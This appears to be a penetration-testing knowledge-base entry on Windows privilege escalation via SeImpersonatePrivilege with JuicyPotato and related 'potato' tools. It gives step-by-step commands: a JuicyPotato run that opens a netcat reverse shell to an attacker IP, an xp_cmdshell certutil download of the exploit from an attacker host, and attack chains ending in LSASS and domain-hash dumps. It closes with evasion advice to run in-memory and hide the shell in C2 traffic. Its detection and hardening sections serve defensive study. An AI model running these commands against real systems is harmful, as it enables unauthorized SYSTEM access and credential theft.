notes:
=== SeImpersonate — JuicyPotato Attack Chain ===
Most reliable Windows privesc when landing as a service account (IIS, MSSQL, Jenkins).

=== ATTACK FLOW ===
1. Confirm privilege: whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
2. Check OS: JuicyPotato requires pre-Server 2019 / pre-Win10 1809
   For newer: use PrintSpoofer or RoguePotato instead
3. Transfer JuicyPotato.exe to target writable directory
4. Stand up listener: nc -lvnp 4444
5. Execute:
   .\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c nc.exe <IP> 4444 -e cmd.exe" -t *
   -l = local COM port, -p = process to launch, -a = arguments, -t = use both token methods

=== MSSQL ENTRY PATH ===
Credentials from file share → mssqlclient.py with -windows-auth
SQL> enable_xp_cmdshell
xp_cmdshell "whoami /priv"   → confirms SeImpersonate enabled
Transfer JuicyPotato via: xp_cmdshell "certutil -urlcache -split -f http://ATTACKER/JP.exe C:\Temp\JP.exe"

=== TECHNICAL MECHANISM ===
JuicyPotato spins up a COM server on a local port
Abuses DCOM/NTLM reflection to coerce a SYSTEM-level connection
Captures the SYSTEM token when it authenticates
Uses CreateProcessWithTokenW (SeImpersonate) or CreateProcessAsUser (SeAssignPrimaryToken)

=== CHAINING CONTEXT ===
SQL RCE → xp_cmdshell → JuicyPotato → SYSTEM shell → LSASS dump → domain hashes
Web shell → IIS service account → JuicyPotato → SYSTEM → secretsdump
Jenkins agent → SYSTEM shell → credential harvest → lateral movement

=== DECISION TREE ===
SeImpersonatePrivilege present?
  YES → OS < Server 2019 / Win10 1809? → JuicyPotato
       → OS >= Server 2019 / Win10 1809? → PrintSpoofer
  NO → Check SeAssignPrimaryTokenPrivilege → same tools, different API used

recommended.note: Newer-OS alternative via the spooler pipe.

name: SeImpersonate - JuicyPotato to SYSTEM
description: With SeImpersonatePrivilege, JuicyPotato abuses DCOM/BITS to capture a SYSTEM token and run a command. Works on older Windows (pre-2019); use PrintSpoofer/RoguePotato on newer builds.

variations.caption: SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11
variations.label: SigmaPotato - reverse shell

variations.caption: SigmaPotato: run arbitrary command as SYSTEM
variations.label: SigmaPotato - run a command

defense.why_it_works: Service accounts with SeImpersonatePrivilege (e.g., MSSQL running as NT SERVICE\MSSQL$) can impersonate any user who authenticates to them. JuicyPotato abuses DCOM/RPC: it creates a local COM server, configures a CLSID that authenticates as SYSTEM, and forces the SYSTEM account to authenticate to the attacker's local named pipe. The resulting SYSTEM token is then used to spawn a new process as SYSTEM.
defense.prerequisites: SeImpersonatePrivilege in current token (common for IIS AppPool, MSSQL service accounts). JuicyPotato.exe binary. A suitable CLSID for the target OS version. Available local port (default 53375). Windows Server 2016 or below (JuicyPotato blocked on Server 2019+; use PrintSpoofer instead).
defense.impact: SYSTEM-level code execution from a service account shell, enabling full system compromise from a limited MSSQL or IIS service account foothold.
defense.detection: JuicyPotato.exe execution (known tool signature). DCOM activation on unexpected CLSID with local loopback. Named pipe creation by service account process. SYSTEM process spawned as child of MSSQL/IIS worker process.
defense.artifacts: Process: JuicyPotato.exe executed by service account | Sysmon Event 1: SYSTEM process with service account parent | Named pipe: created by service account process | Network: loopback DCOM traffic on port 53375
defense.prevention: Do not run MSSQL, IIS, or other services as accounts with SeImpersonatePrivilege unless required. Use dedicated low-privilege service accounts (GMSA). On Server 2019+, JuicyPotato is blocked by default. Apply Credential Guard and token filtering. Monitor for DCOM abuse.
defense.misconfiguration: MSSQL service running as NT AUTHORITY\SYSTEM or a service account with SeImpersonatePrivilege on a Server 2016 or earlier host.
defense.vulnerable_config:
# Service account has SeImpersonatePrivilege:
whoami /priv | findstr SeImpersonate
# SeImpersonatePrivilege Enabled

# JuicyPotato execution:
.\JuicyPotato.exe -l 53375 -p C:\Windows\system32\cmd.exe -t * -c '{4991d34b-80a1-4291-83b6-3328366b9097}'
# Returns SYSTEM shell
defense.secure_config:
# Use GMSA for MSSQL:
New-ADServiceAccount -Name gMSA_MSSQL -DNSHostName dc01.inlanefreight.local
Install-ADServiceAccount gMSA_MSSQL

# Remove SeImpersonatePrivilege from service accounts where possible:
# GPO: User Rights Assignment > Impersonate a client after authentication
# List only: NT SERVICE\* accounts that require it

# Upgrade to Server 2019+ (JuicyPotato blocked by default)
defense.evasion: Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel.
